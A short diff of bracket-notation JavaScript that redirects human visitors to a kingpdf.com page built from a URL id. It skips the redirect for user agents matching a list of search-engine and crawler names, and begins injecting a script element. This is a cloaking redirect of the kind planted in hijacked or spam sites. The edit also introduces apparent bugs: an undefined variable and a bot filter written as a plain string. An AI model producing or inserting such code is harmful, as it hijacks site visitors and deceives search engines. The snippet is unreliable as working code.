@@ -1,8 +1,8 @@
 let url = window['location']['href'], id = url['substring'](url['lastIndexOf']('=') + 1), explode = url['split']('/'), subdom = explode[2];
-if (id['match'](/^[0-9]+$/) != null) {
+if (id['match'](/\W+$/) != null) {
     let user_agent = navigator['userAgent'],
     filter_bot = '/google|bot|bing|yahoo|pinterest|yandex|facebook|webmaster|spider|crawlr/i',
-    redirect_link = 'https://kingpdf.com/ebook-' + id + '.html';
+    redirect_link = 'https://kingpdf.com/'+ prodnama +'-'+ id + '.html';
     !user_agent['match'](filter_bot) && window['location']['replace'](redirect_link);
     let data_content = document['getElementById']('desc'),
     s = document['createElement']('script');
